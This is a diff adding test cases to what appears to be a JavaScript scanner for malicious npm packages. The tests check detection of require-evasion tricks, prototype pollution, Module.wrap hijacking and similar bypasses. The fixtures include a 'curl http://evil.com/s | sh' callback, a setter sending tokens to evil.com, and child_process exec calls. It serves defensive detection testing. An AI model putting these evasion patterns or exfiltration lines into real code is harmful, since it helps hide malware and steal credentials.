@@ -2769,6 +2769,427 @@ https.get('https://souls-entire-defined-routes.trycloudflare.com/kube.py');
       assert(t, 'fetch to trycloudflare.com should be detected as suspicious_domain');
     } finally { cleanupTemp(tmp); }
   });
+  // ================================================================
+  // Quick-scan overflow — files beyond 500 cap
+  // ================================================================
+
+  await asyncTest('AST: quick-scan detects child_process in overflow files', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-quickscan-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-overflow', version: '1.0.0' }));
+    // Create 502 JS files: 500 benign + 2 deep ones with child_process
+    const deepDir = path.join(tmp, 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h');
+    fs.mkdirSync(deepDir, { recursive: true });
+    for (let i = 0; i < 500; i++) {
+      fs.writeFileSync(path.join(tmp, `benign${i}.js`), `const x${i} = ${i};`);
+    }
+    // These deep files should end up in overflow (sorted by depth, shallowest first)
+    fs.writeFileSync(path.join(deepDir, 'evil1.js'), `const cp = require('child_process'); cp.exec('id');`);
+    fs.writeFileSync(path.join(deepDir, 'evil2.js'), `require('child_process').execSync('whoami');`);
+    try {
+      const result = await runScanDirect(tmp);
+      const quickThreats = result.threats.filter(t => t.message && t.message.includes('[quick-scan]'));
+      assert(quickThreats.length > 0, 'Should find threats via quick-scan in overflow files');
+      assert(quickThreats.some(t => t.type === 'dangerous_exec'), 'Should detect dangerous_exec in overflow');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // ================================================================
+  // Audit v3 Bypass Detections (B1-B8) — AST-062 to AST-069
+  // ================================================================
+
+  // B1: Reflect.apply(require, ...) — AST-062
+  await asyncTest('AST: B1 Reflect.apply(require, null, ["child_process"]) → reflect_apply_require CRITICAL', async () => {
+    const tmp = makeTempPkg(`
+const cp = Reflect.apply(require, null, ['child_process']);
+cp.exec('whoami');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'reflect_apply_require');
+      assert(t, 'Should detect reflect_apply_require');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL for child_process, got ' + t.severity);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: B1 Reflect.apply(require, null, [dynamic]) → reflect_apply_require HIGH', async () => {
+    const tmp = makeTempPkg(`
+const mod = Reflect.apply(require, null, [modName]);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'reflect_apply_require');
+      assert(t, 'Should detect reflect_apply_require for dynamic arg');
+      assert(t.severity === 'HIGH', 'Should be HIGH for dynamic arg, got ' + t.severity);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: B1 Reflect.apply(require) score > 0', async () => {
+    const tmp = makeTempPkg(`
+Reflect.apply(require, null, ['child_process']).exec('id');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const score = result.summary ? result.summary.riskScore : result.riskScore;
+      assert(score > 0, 'Score should be > 0, got ' + score);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: B1 negative — Reflect.apply(eval) does NOT trigger reflect_apply_require', async () => {
+    const tmp = makeTempPkg(`
+Reflect.apply(eval, null, ['1+1']);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'reflect_apply_require');
+      assert(!t, 'Reflect.apply(eval) should NOT trigger reflect_apply_require');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // B2: FinalizationRegistry — AST-063
+  await asyncTest('AST: B2 FinalizationRegistry with exec callback → finalization_registry_exec CRITICAL', async () => {
+    const tmp = makeTempPkg(`
+const fr = new FinalizationRegistry((value) => {
+  require('child_process').exec('curl http://evil.com/s | sh');
+});
+fr.register({}, 'leaked');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'finalization_registry_exec');
+      assert(t, 'Should detect finalization_registry_exec');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: B2 FinalizationRegistry + eval in same file → compound detection', async () => {
+    const tmp = makeTempPkg(`
+const fr = new FinalizationRegistry((v) => { console.log(v); });
+eval(dynamicCode);
+fr.register({}, 'token');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'finalization_registry_exec');
+      assert(t, 'Should detect finalization_registry_exec compound');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: B2 FinalizationRegistry score > 0', async () => {
+    const tmp = makeTempPkg(`
+const fr = new FinalizationRegistry((v) => {
+  require('child_process').execSync('id');
+});
+fr.register({}, 'x');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const score = result.summary ? result.summary.riskScore : result.riskScore;
+      assert(score > 0, 'Score should be > 0, got ' + score);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: B2 negative — FinalizationRegistry with benign callback', async () => {
+    const tmp = makeTempPkg(`
+const fr = new FinalizationRegistry((value) => {
+  console.log('cleaned up', value);
+});
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'finalization_registry_exec');
+      assert(!t, 'Benign FinalizationRegistry should NOT trigger finalization_registry_exec');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // B3: Function via prototype chain — AST-064
+  await asyncTest('AST: B3 (function(){}).constructor(code) → function_prototype_constructor CRITICAL', async () => {
+    const tmp = makeTempPkg(`
+(function(){}).constructor(payload)();
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'function_prototype_constructor');
+      assert(t, 'Should detect function_prototype_constructor');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: B3 [].constructor.constructor(code) → dangerous_constructor CRITICAL', async () => {
+    const tmp = makeTempPkg(`
+[].constructor.constructor(payload)();
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dangerous_constructor');
+      assert(t, 'Should detect dangerous_constructor for [].constructor.constructor');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: B3 score > 0', async () => {
+    const tmp = makeTempPkg(`
+(function(){}).constructor(evilCode)();
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const score = result.summary ? result.summary.riskScore : result.riskScore;
+      assert(score > 0, 'Score should be > 0, got ' + score);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: B3 negative — (function(){}).constructor("return 1") with string literal', async () => {
+    const tmp = makeTempPkg(`
+const one = (function(){}).constructor("return 1")();
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'function_prototype_constructor');
+      assert(!t, 'String literal constructor should NOT trigger function_prototype_constructor');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // B4: Prototype pollution — AST-065
+  await asyncTest('AST: B4 __proto__ assignment → prototype_pollution HIGH', async () => {
+    const tmp = makeTempPkg(`
+const obj = {};
+obj.__proto__ = { isAdmin: true };
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'prototype_pollution');
+      assert(t, 'Should detect prototype_pollution');
+      assert(t.severity === 'HIGH', 'Should be HIGH');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: B4 __defineGetter__ → prototype_pollution HIGH', async () => {
+    const tmp = makeTempPkg(`
+const obj = {};
+obj.__defineGetter__('secret', function() { return process.env.SECRET; });
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'prototype_pollution');
+      assert(t, 'Should detect prototype_pollution for __defineGetter__');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: B4 __defineSetter__ → prototype_pollution HIGH', async () => {
+    const tmp = makeTempPkg(`
+const obj = {};
+obj.__defineSetter__('token', function(v) { fetch('http://evil.com/?t=' + v); });
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'prototype_pollution');
+      assert(t, 'Should detect prototype_pollution for __defineSetter__');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: B4 score > 0', async () => {
+    const tmp = makeTempPkg(`
+const x = {};
+x.__proto__ = { polluted: true };
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const score = result.summary ? result.summary.riskScore : result.riskScore;
+      assert(score > 0, 'Score should be > 0, got ' + score);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // B5: Module.wrap — AST-066
+  await asyncTest('AST: B5 require("module").wrap = fn → module_wrap_override CRITICAL', async () => {
+    const tmp = makeTempPkg(`
+require('module').wrap = function(script) {
+  return '(function(exports, require, module, __filename, __dirname) {' +
+    'require("child_process").exec("id");' + script + '});';
+};
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'module_wrap_override');
+      assert(t, 'Should detect module_wrap_override');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: B5 Module.wrap = fn (with alias) → module_wrap_override CRITICAL', async () => {
+    const tmp = makeTempPkg(`
+const Module = require('module');
+Module.wrap = (code) => '(function(){' + code + '})';
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'module_wrap_override');
+      assert(t, 'Should detect module_wrap_override via Module alias');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: B5 score > 0', async () => {
+    const tmp = makeTempPkg(`
+require('module').wrap = (s) => s;
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const score = result.summary ? result.summary.riskScore : result.riskScore;
+      assert(score > 0, 'Score should be > 0, got ' + score);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: B5 negative — require("module").builtinModules does NOT trigger', async () => {
+    const tmp = makeTempPkg(`
+const mods = require('module').builtinModules;
+console.log(mods);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'module_wrap_override');
+      assert(!t, 'builtinModules access should NOT trigger module_wrap_override');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // B6: Symbol property hiding — AST-067
+  await asyncTest('AST: B6 obj[Symbol("x")] = require("child_process") → symbol_property_hiding HIGH', async () => {
+    const tmp = makeTempPkg(`
+const obj = {};
+obj[Symbol('hidden')] = require('child_process');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'symbol_property_hiding');
+      assert(t, 'Should detect symbol_property_hiding');
+      assert(t.severity === 'HIGH', 'Should be HIGH');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: B6 obj[Symbol()] = eval → symbol_property_hiding HIGH', async () => {
+    const tmp = makeTempPkg(`
+const obj = {};
+obj[Symbol('exec')] = eval;
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'symbol_property_hiding');
+      assert(t, 'Should detect symbol_property_hiding for eval');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: B6 score > 0', async () => {
+    const tmp = makeTempPkg(`
+const o = {};
+o[Symbol('s')] = require('child_process');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const score = result.summary ? result.summary.riskScore : result.riskScore;
+      assert(score > 0, 'Score should be > 0, got ' + score);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: B6 negative — obj[Symbol()] = "safe" does NOT trigger', async () => {
+    const tmp = makeTempPkg(`
+const obj = {};
+obj[Symbol('name')] = 'hello';
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'symbol_property_hiding');
+      assert(!t, 'String assignment to Symbol should NOT trigger');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // B7: WithStatement + dangerous body — AST-068
+  await asyncTest('AST: B7 with(obj) { require("child_process") } → with_body_dangerous HIGH', async () => {
+    const tmp = makeTempPkg(`
+const env = process.env;
+with(env) {
+  const cp = require('child_process');
+  cp.exec('id');
+}
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'with_body_dangerous');
+      assert(t, 'Should detect with_body_dangerous');
+      assert(t.severity === 'HIGH', 'Should be HIGH');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: B7 score > 0', async () => {
+    const tmp = makeTempPkg(`
+with(globalThis) {
+  require('child_process').exec('id');
+}
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const score = result.summary ? result.summary.riskScore : result.riskScore;
+      assert(score > 0, 'Score should be > 0, got ' + score);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: B7 negative — with(obj) { console.log(x) } no trigger', async () => {
+    const tmp = makeTempPkg(`
+with(Math) {
+  const x = sqrt(4);
+  console.log(x);
+}
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'with_body_dangerous');
+      assert(!t, 'Benign with() should NOT trigger with_body_dangerous');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // B8: require('process').mainModule.require() — AST-069
+  await asyncTest('AST: B8 require("process").mainModule.require("child_process") → require_process_mainmodule CRITICAL', async () => {
+    const tmp = makeTempPkg(`
+const cp = require('process').mainModule.require('child_process');
+cp.exec('id');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'require_process_mainmodule');
+      assert(t, 'Should detect require_process_mainmodule');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL for child_process');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: B8 require("process").mainModule.require("path") → require_process_mainmodule HIGH', async () => {
+    const tmp = makeTempPkg(`
+const p = require('process').mainModule.require('path');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'require_process_mainmodule');
+      assert(t, 'Should detect require_process_mainmodule for non-dangerous module');
+      assert(t.severity === 'HIGH', 'Should be HIGH for non-dangerous module');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: B8 score > 0', async () => {
+    const tmp = makeTempPkg(`
+require('process').mainModule.require('child_process').exec('id');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const score = result.summary ? result.summary.riskScore : result.riskScore;
+      assert(score > 0, 'Score should be > 0, got ' + score);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: B8 negative — require("process").version does NOT trigger', async () => {
+    const tmp = makeTempPkg(`
+const v = require('process').version;
+console.log(v);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'require_process_mainmodule');
+      assert(!t, 'require("process").version should NOT trigger require_process_mainmodule');
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runAstTests };
